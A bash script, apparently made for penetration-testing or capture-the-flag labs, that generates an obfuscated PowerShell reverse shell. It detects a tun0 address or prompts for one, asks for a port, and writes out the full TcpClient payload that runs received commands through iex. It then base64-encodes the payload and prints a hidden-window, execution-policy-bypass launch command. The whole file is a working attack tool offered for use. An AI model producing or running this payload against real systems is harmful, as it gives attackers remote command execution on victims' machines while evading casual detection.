#!/bin/bash
echo "  [i] This script generates a powershell reverse shell one-liner based on the current ip and port of your listener."

ip=$(ip a | grep -A 2 tun0: | grep inet | cut -d ' ' -f 6 | cut -d '/' -f 1)
if [ -n "$ip" ]; then
    echo
    echo "  [+] Found the address for your tun0 interface: $ip"
    echo -n "  [?] Would you like to use it as the address for your listener? (Y/n) "
    read -r answer
    if [ "$answer" = 'n' ]; then
        ip=''
    fi
fi

echo
if [ -z "$ip" ]; then
    echo -n "  [?] IP address: "
    read -r ip
fi
echo -n "  [?] Port: "
read -r port

echo
commandString="\
\$client=New-Object System.Net.Sockets.TcpClient(\"$ip\",$port);\
\$stream=\$client.GetStream();\
[byte[]]\$bytes=0..65535|%{0};\
while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){\
;\
\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\
\$sendback=(iex \$data 2>&1|Out-String);\
\$sendback2=\$sendback+\"PS \"+(pwd).Path+\"> \";\
\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\
\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\
\$stream.Flush();\
};\
\$client.Close();\
"
echo "  [+] Command to encode:"
echo "$commandString"

echo
base64Command=$(echo -n "$commandString" | iconv -t utf-16le | base64 -w 0)
echo "  [+] Converted to UTF-16le Base64 (the format powershell needs):"
echo "$base64Command"

echo
echo "  [+] Here you go. Use wisely."
echo "powershell -nop -w hidden -ex bypass -en $base64Command"
